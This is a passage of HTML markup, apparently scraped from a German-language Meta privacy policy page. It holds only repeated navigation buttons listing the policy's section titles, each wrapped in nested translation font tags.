                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
